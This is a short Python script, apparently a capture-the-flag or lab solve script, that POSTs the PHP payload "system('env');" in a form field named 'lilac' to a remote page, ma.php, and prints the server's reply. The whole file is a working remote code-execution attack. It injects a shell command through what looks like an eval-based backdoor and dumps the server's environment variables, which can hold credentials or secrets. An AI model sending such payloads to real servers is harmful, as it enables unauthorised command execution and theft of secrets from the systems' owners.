import requests

session = requests.Session()

url = "http://405.trainoi.com:27084/ma.php"

data = {
	'lilac': "system('env');"
}

r = session.post(url, data=data)
print(r.text)
